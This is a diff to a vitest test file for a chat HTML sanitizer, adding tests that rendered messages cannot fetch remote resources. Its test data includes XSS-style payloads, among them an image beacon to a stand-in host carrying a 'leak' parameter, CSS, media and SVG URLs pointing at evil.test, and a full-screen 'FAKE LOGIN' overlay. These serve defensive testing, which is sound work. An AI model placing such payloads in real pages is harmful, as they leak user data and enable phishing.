@@ -3,11 +3,14 @@
  * DOMPurify needs a window, so these run under vitest/jsdom.
  */
 import { describe, it, expect } from 'vitest';
-import { createChatHtmlSanitizer, sanitizeChatHtml } from '../../src/lib/client/features/chat/message-segments/sanitize-chat-html';
+import {
+    createChatHtmlSanitizer,
+    sanitizeChatHtml,
+} from '../../src/lib/client/features/chat/message-segments/sanitize-chat-html';
 
 const withSampleWidget = createChatHtmlSanitizer({
     tags: ['x-sample-widget'],
-    attrs: { 'x-sample-widget': ['sample-id'] }
+    attrs: { 'x-sample-widget': ['sample-id'] },
 });
 
 describe('sanitizeChatHtml — XSS stripping', () => {
@@ -73,7 +76,9 @@ describe('custom elements — registered through the allow-list', () => {
     });
 
     it('strips attributes not allowed for the registered element', () => {
-        const out = withSampleWidget('<x-sample-widget sample-id="1" srcdoc="x" style="position:fixed;inset:0" extra-attr="y"></x-sample-widget>');
+        const out = withSampleWidget(
+            '<x-sample-widget sample-id="1" srcdoc="x" style="position:fixed;inset:0" extra-attr="y"></x-sample-widget>'
+        );
         expect(out).toContain('sample-id="1"');
         expect(out).not.toContain('srcdoc');
         expect(out).not.toMatch(/style=/i);
@@ -103,7 +108,9 @@ describe('sanitizeChatHtml — phishing and overlay hardening', () => {
     });
 
     it('strips inline style overlays', () => {
-        const out = sanitizeChatHtml('<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">FAKE LOGIN</div>');
+        const out = sanitizeChatHtml(
+            '<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">FAKE LOGIN</div>'
+        );
         expect(out).not.toMatch(/style=/i);
         expect(out).toContain('FAKE LOGIN');
     });
@@ -112,5 +119,29 @@ describe('sanitizeChatHtml — phishing and overlay hardening', () => {
         const out = sanitizeChatHtml('<img src="https://evil.example/b?d=leak">');
         expect(out.toLowerCase()).not.toContain('<img');
         expect(out).not.toContain('evil.example');
+    });
+});
+
+describe('sanitizeChatHtml — no remote fetch on render', () => {
+    const payloads: Array<[string, string]> = [
+        ['<style> element after text', 'ok<style>body{background:url(https://evil.test/x)}</style>'],
+        ['video poster', '<video poster="https://evil.test/p"></video>'],
+        ['audio src', '<audio src="https://evil.test/a"></audio>'],
+        ['video source', '<video><source src="https://evil.test/v"></video>'],
+        ['picture srcset', '<picture><source srcset="https://evil.test/s"></picture>'],
+        ['svg image href', '<svg><image href="https://evil.test/i"/></svg>'],
+        ['svg use href', '<svg><use href="https://evil.test/u#x"/></svg>'],
+        ['table background', '<table background="https://evil.test/b"><tr><td>x</td></tr></table>'],
+    ];
+
+    it.each(payloads)('strips %s', (_name, html) => {
+        expect(sanitizeChatHtml(html)).not.toContain('evil.test');
+    });
+
+    it('keeps the surrounding text and table content', () => {
+        expect(sanitizeChatHtml('ok<style>p{}</style>')).toBe('ok');
+        expect(sanitizeChatHtml('<table background="https://evil.test/b"><tr><td>x</td></tr></table>')).toContain(
+            '<td>x</td>'
+        );
     });
 });
